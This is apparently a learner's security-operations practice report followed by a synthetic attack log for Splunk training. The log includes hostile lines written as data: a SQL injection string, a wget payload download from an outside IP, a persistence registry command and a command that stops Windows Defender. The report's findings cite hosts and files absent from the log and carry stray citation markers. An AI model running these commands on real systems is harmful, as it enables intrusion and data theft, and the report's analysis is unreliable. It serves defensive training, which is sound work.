### If you wamma the same test i did, just cope that fake.log below that 'Time spent" and paste in in a New txt file, and upload it to your splunk, and to your ai to make them generate challenges for you


# Incident Investigation Report: Unauthorized Access & Data Exfiltration
**Date:** 2026-02-10
**Phase:** 1.0 Practical Final Task
**Analyst:** [Your Name/Handle]

---

## 1. Objective & Hypothesis
* [cite_start]**Objective:** Investigate mixed log sources to identify a potential security breach. [cite: 19]
* [cite_start]**Hypothesis:** An external attacker is attempting to compromise internal servers via web vulnerabilities and lateral movement. [cite: 16]

## 2. Evidence Collected (Raw Logs)
* [cite_start]**Source 1 (Firewall):** Connection from `203.0.113.5` to `192.168.1.105` on port 443. [cite: 99]
* [cite_start]**Source 2 (Windows):** Event 4625 (Failed Login) and Event 4624 (Success) on `WIN-SERVER02`. [cite: 101]
* [cite_start]**Source 3 (Process):** `cmd.exe` spawned from `explorer.exe` on workstation. [cite: 101]
* [cite_start]**Source 4 (Application):** `INSUFFICIENT_FUNDS` error in payment processor logs. [cite: 105]

## 3. Investigation & Analysis

### Analyst Findings (Initial):
* Found IP `203.0.113.5` touching two hosts.
* Detected a "GET" command used to attempt admin access.
* Identified a critical new process (`cmd.exe`) which is likely malware.
* Noticed suspicious malware named "MalwareScanner.exe" and database errors suggesting theft attempts.

### Peer Review / Refined Analysis:
* **Reconnaissance:** The attacker used "Brute Force" on `WIN-SERVER02`. Status code `0xC0000064` confirms they were guessing usernames that do not exist.
* [cite_start]**Exploitation:** The attacker targeted `192.168.1.105` (Web Server) via Port 443/8443. [cite: 99]
* [cite_start]**Persistence:** The "MalwareScanner.exe" was installed as a Windows Service (Event 7045) to maintain access. [cite: 101]
* [cite_start]**Action on Objectives:** The `INSUFFICIENT_FUNDS` error suggests the attacker attempted to execute a transaction after gaining access to the database or application keys. [cite: 105]

## 4. Conclusion & Lessons Learned
* **Verdict:** True Positive (Critical Incident).
* [cite_start]**Lesson 1:** HTTP (unencrypted) allowed the attacker to potentially see sensitive data. [cite: 89]
* **Lesson 2:** Monitoring for common Windows processes (like `cmd.exe`) starting in unusual ways is a high-value detection.

---
**Status:** CLOSED
**Time Spent:** 1.5 Hours
--------------------

# The Fake.logs :
# ===== SSH BRUTE FORCE ATTEMPTS =====
2023-10-10 22:15:34 sshd[1234]: Failed password for invalid user admin from 185.220.101.4 port 54321 ssh2
2023-10-10 22:15:36 sshd[1235]: Failed password for root from 185.220.101.4 port 54322 ssh2
2023-10-10 22:15:38 sshd[1236]: Failed password for invalid user administrator from 185.220.101.4 port 54323 ssh2
2023-10-10 22:15:41 sshd[1237]: Failed password for user webadmin from 185.220.101.4 port 54324 ssh2
2023-10-10 22:16:05 sshd[1245]: Accepted password for user jsmith from 192.168.1.105 port 51122 ssh2
2023-10-10 22:16:07 sshd[1246]: pam_unix(sshd:session): session opened for user jsmith by (uid=0)

# ===== MALICIOUS WEB TRAFFIC =====
192.168.1.105 - jsmith [10/Oct/2023:22:17:12 -0500] "GET /wp-admin HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.105 - jsmith [10/Oct/2023:22:17:45 -0500] "GET /admin.php HTTP/1.1" 404 198 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.105 - jsmith [10/Oct/2023:22:18:23 -0500] "GET /phpmyadmin/ HTTP/1.1" 404 205 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

185.220.101.4 - - [10/Oct/2023:22:19:01 -0500] "GET /?username=admin&password='OR'1'='1 HTTP/1.1" 200 3421 "-" "sqlmap/1.6#dev"
185.220.101.4 - - [10/Oct/2023:22:19:34 -0500] "POST /login.php HTTP/1.1" 200 3124 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"

# ===== SUSPICIOUS FILE DOWNLOAD =====
2023-10-10 22:20:15,789 [INFO] proxy_server: User jsmith downloaded file "update_package.exe" from http://malicious-cdn.com/files/update.zip (size: 15.4MB)

# ===== WINDOWS EVENT LOGS (Compromised Workstation) =====
Oct 10 22:21:05 WIN-JSMITH Security: 4688: A new process has been created. Process: C:\Users\jsmith\Downloads\update_package.exe Parent: explorer.exe User: WIN-JSMITH\jsmith
Oct 10 22:21:12 WIN-JSMITH Security: 4688: A new process has been created. Process: C:\Windows\System32\cmd.exe Parent: update_package.exe User: WIN-JSMITH\jsmith
Oct 10 22:21:45 WIN-JSMITH System: 7045: A service was installed in the system. Service: WindowsUpdateHelper Service File: C:\ProgramData\Windows\updater.exe Account: LocalSystem
Oct 10 22:22:01 WIN-JSMITH Security: 4663: An attempt was made to access an object. Object: C:\Finance\Q3_Earnings_Report.pdf User: WIN-JSMITH\jsmith Access: READ

# ===== DATA EXFILTRATION =====
2023-10-10 22:22:34 firewall01 %ASA-6-302013: Built outbound TCP connection 789012 for inside:192.168.1.105/54321 to outside:45.134.26.78/443
2023-10-10 22:22:45 firewall01 %ASA-6-302014: Teardown TCP connection 789012 for inside:192.168.1.105/54321 to outside:45.134.26.78/443 duration 0:00:11 bytes 21548721
2023-10-10 22:23:01 proxy_server: ALERT: Large data transfer detected - User jsmith transferred 21.5MB to external IP 45.134.26.78 (classified: Suspicious)

# ===== LATERAL MOVEMENT ATTEMPTS =====
Oct 10 23:45:12 dc01.corp.local Security: 4625: An account failed to log on. Account: CORP\jsmith Workstation: \\WIN-JSMITH Status: 0xC0000064
Oct 10 23:45:23 dc01.corp.local Security: 4625: An account failed to log on. Account: CORP\administrator Workstation: \\WIN-JSMITH Status: 0xC0000064
2023-10-10 23:46:05 sshd[2345]: Failed password for user root from 192.168.1.105 port 51123 ssh2

# ===== PRIVILEGE ESCALATION =====
2023-10-11 08:32:12,456 [ERROR] app_server: Exception in thread main: java.sql.SQLException: Access denied for user 'root'@'192.168.1.105'
2023-10-11 08:32:45,789 [ERROR] app_server: Multiple authentication failures detected from IP 192.168.1.105
2023-10-11 08:33:01,123 [CRITICAL] app_server: Database query executed: "GRANT ALL PRIVILEGES ON *.* TO 'jsmith'@'%' IDENTIFIED BY 'TempPass123!'"

# ===== DATABASE ACCESS & THEFT =====
2023-10-11 08:45:23.456 UTC [38901] user=jsmith db=customer_db LOG:  statement: SELECT * FROM users;
2023-10-11 08:46:12.789 UTC [38902] user=jsmith db=customer_db LOG:  statement: SELECT * FROM credit_cards;
2023-10-11 08:47:45.123 UTC [38903] user=jsmith db=hr_db LOG:  statement: COPY employees TO '/tmp/employees_export.csv';
2023-10-11 08:48:34.567 UTC [38904] user=jsmith db=finance_db LOG:  statement: SELECT * FROM transactions WHERE amount > 10000;

# ===== MORE EXFILTRATION =====
2023-10-11 09:15:45 firewall01 %ASA-6-302013: Built outbound TCP connection 789345 for inside:192.168.1.105/54322 to outside:45.134.26.78/443
2023-10-11 09:16:23 firewall01 %ASA-6-302014: Teardown TCP connection 789345 for inside:192.168.1.105/54322 to outside:45.134.26.78/443 duration 0:00:38 bytes 54231876
2023-10-11 09:16:45 proxy_server: CRITICAL: Extremely large outbound transfer - 54.2MB to 45.134.26.78 by user jsmith

# ===== MALWARE COMMUNICATION =====
2023-10-11 10:22:34 WIN-JSMITH System: 7036: The WindowsUpdateHelper service entered the running state.
2023-10-11 10:23:01 firewall01 %ASA-6-302013: Built outbound UDP connection 789456 for inside:192.168.1.105/5353 to outside:185.220.101.4/53
2023-10-11 10:23:12 DNS_SERVER: Query: update.microsoft-check.com. IN A from 192.168.1.105 (suspicious domain)

# ===== PERSISTENCE MECHANISM =====
Oct 11 11:45:23 WIN-JSMITH Security: 4688: A new process has been created. Process: C:\Windows\System32\reg.exe Parent: updater.exe Arguments: add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v UpdateHelper /t REG_SZ /d C:\ProgramData\Windows\updater.exe /f

# ===== ATTEMPT TO DISABLE SECURITY =====
2023-10-11 12:15:34 WIN-JSMITH Security: 4688: A new process has been created. Process: C:\Windows\System32\net.exe Parent: cmd.exe Arguments: stop WinDefend
2023-10-11 12:15:45 WIN-JSMITH System: 7034: The Windows Defender Antivirus Service service terminated unexpectedly.

# ===== ADDITIONAL COMPROMISE =====
2023-10-11 14:32:12 web-server01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC=185.220.101.4 DST=10.0.0.100 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=54321 DF PROTO=TCP SPT=4444 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0
2023-10-11 14:33:45 app_server: WARN: Detected Java deserialization attempt from IP 185.220.101.4
2023-10-11 14:34:12 app_server: CRITICAL: Remote code execution detected - Process spawned: /bin/sh -c wget http://185.220.101.4/malware.sh -O /tmp/m.sh

# ===== FINAL MASS DATA EXPORT =====
2023-10-11 22:45:23,456 [INFO] backup_service: User jsmith initiated full database backup
2023-10-11 22:46:12,789 [INFO] backup_service: Backup file created: /backups/full_database_20231011.tar.gz (size: 2.4GB)
2023-10-11 22:47:45 firewall01 %ASA-6-302013: Built outbound TCP connection 789789 for inside:192.168.1.105/54399 to outside:45.134.26.78/443
2023-10-11 22:50:23 firewall01 %ASA-6-302014: Teardown TCP connection 789789 for inside:192.168.1.105/54399 to outside:45.134.26.78/443 duration 0:02:38 bytes 2516582400

# ===== SECURITY ALERTS =====
2023-10-12 08:15:34,567 [ALERT] IDS_SYSTEM: Multiple policy violations detected for user jsmith (192.168.1.105)
2023-10-12 08:16:12,789 [ALERT] IDS_SYSTEM: Beaconing detected to IP 45.134.26.78 (threat score: 95/100)
2023-10-12 08:17:45,123 [ALERT] IDS_SYSTEM: Data exfiltration pattern detected - 2.5GB transferred in 2 minutes

# ===== INCIDENT RESPONSE ACTIONS =====
2023-10-12 08:30:12 dc01.corp.local Security: 4725: A user account was disabled. Account: CORP\jsmith
2023-10-12 08:30:45 firewall01 %ASA-4-106023: Deny tcp src inside:192.168.1.105/any dst outside:any/any
2023-10-12 08:31:23 WIN-JSMITH System: 7036: The WindowsUpdateHelper service entered the stopped state.
2023-10-12 08:32:01 proxy_server: INFO: User jsmith account locked - excessive data transfer policy violation

# ===== FORENSIC ARTIFACTS =====
2023-10-12 09:15:34 WIN-JSMITH Security: 4688: A new process has been created. Process: C:\Tools\FTK\ftkimager.exe Parent: cmd.exe User: WIN-IRTEAM\investigator
2023-10-12 09:16:45 app_server: INFO: Forensic capture initiated - Memory dump of server app-server-01
2023-10-12 09:17:23,456 [INFO] investigation: Timeline analysis started - timeframe: 2023-10-10 22:00:00 to 2023-10-12 08:30:00

# ===== ADDITIONAL IOCS FOUND =====
2023-10-12 10:45:12 AV_SERVER: MALWARE DETECTED: Trojan.PowerShell.Meterpreter in C:\ProgramData\Windows\updater.exe (hash: a1b2c3d4e5f67890)
2023-10-12 10:46:34 AV_SERVER: MALWARE DETECTED: Backdoor.Linux.Bashdoor in /tmp/m.sh (hash: f0e1d2c3b4a59687)
2023-10-12 10:47:45 DNS_SERVER: BLOCKED: Query to malicious domain update.microsoft-check.com (threat intel feed match)

2023-10-10 09:15:23,456 [INFO] app_server: User alice logged in successfully from 192.168.1.110
2023-10-10 10:30:45,789 [INFO] app_server: User bob accessed report Q3_Sales.pdf
2023-10-10 14:12:34,123 [INFO] backup_service: Scheduled nightly backup completed successfully
2023-10-11 08:45:12,567 [INFO] app_server: 200+ users logged in during morning peak
192.168.1.110 - alice [11/Oct/2023:11:22:33 -0500] "GET /reports/daily_sales.pdf HTTP/1.1" 200 451234 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.111 - bob [11/Oct/2023:13:45:12 -0500] "POST /api/submit_form HTTP/1.1" 200 123 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
2023-10-12 08:00:12 firewall01 %ASA-6-302013: Built inbound TCP connection 123456 for outside:8.8.8.8/443 to inside:192.168.1.112/54321

-------------------------------------------
